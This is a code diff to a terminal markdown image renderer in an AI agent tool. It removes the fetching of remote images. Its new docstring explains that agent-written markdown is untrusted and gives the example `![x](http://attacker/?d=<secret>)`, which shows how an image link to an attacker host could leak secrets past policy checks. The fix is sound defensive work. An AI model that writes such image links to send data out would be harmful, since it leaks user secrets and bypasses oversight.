@@ -13,7 +13,6 @@ import mimetypes
 import os
 from pathlib import Path
 from urllib.parse import unquote, urlparse
-from urllib.request import Request, urlopen
 
 from capabledeputy.cli.terminal_caps import caps
 
@@ -56,15 +55,26 @@ def inline_graphics_enabled() -> bool:
 
 
 def resolve_trusted_image_source(src: str) -> Path | None:
-    """Resolve a markdown image target to a local file path, if safe."""
+    """Resolve a markdown image target to a local file path, if safe.
+
+    Agent-authored markdown is UNTRUSTED (the planner sits outside the TCB),
+    so a remote `http(s)` image target is NEVER dereferenced here: doing so
+    fires an outbound request to a planner-chosen host — an exfiltration
+    channel (`![x](http://attacker/?d=<secret>)`) that bypasses the policy
+    chokepoint and the information-flow taint engine entirely (#292). Only
+    local files are resolved for inline rendering; remote targets return
+    None and render as an "image unavailable" placeholder. If remote inline
+    images are ever wanted, they must be fetched through `web.fetch` so the
+    destination-gated egress rules apply.
+    """
     raw = (src or "").strip()
     if not raw or raw.startswith("data:"):
+        return None
+    if raw.startswith(("http://", "https://")):
         return None
     if raw.startswith("file://"):
         parsed = urlparse(raw)
         path = Path(unquote(parsed.path))
-    elif raw.startswith(("http://", "https://")):
-        return _fetch_remote_image(raw)
     else:
         path = Path(os.path.expanduser(raw))
         if not path.is_absolute():
@@ -119,30 +129,3 @@ def emit_inline_image(path: Path, *, max_cols: int = 72) -> str:
     if c.family == "iterm2":
         return iterm2_image_sequence(path)
     return ""
-
-
-def _fetch_remote_image(url: str) -> Path | None:
-    try:
-        req = Request(url, headers={"User-Agent": "CapDep/1.0"})
-        with urlopen(req, timeout=8) as resp:  # noqa: S310 — trusted agent markdown only
-            content_type = (resp.headers.get("Content-Type") or "").lower()
-            if content_type and not content_type.startswith("image/"):
-                return None
-            data = resp.read(_MAX_INLINE_BYTES + 1)
-    except OSError:
-        return None
-    if len(data) > _MAX_INLINE_BYTES:
-        return None
-    suffix = {
-        "image/png": ".png",
-        "image/jpeg": ".jpg",
-        "image/gif": ".gif",
-        "image/webp": ".webp",
-    }.get(content_type.split(";")[0].strip(), ".img")
-    cache_dir = Path(os.path.expanduser("~/.cache/capabledeputy/inline-images"))
-    cache_dir.mkdir(parents=True, exist_ok=True)
-    digest = base64.urlsafe_b64encode(url.encode()).decode().rstrip("=")[:32]
-    target = cache_dir / f"{digest}{suffix}"
-    if not target.exists():
-        target.write_bytes(data)
-    return target
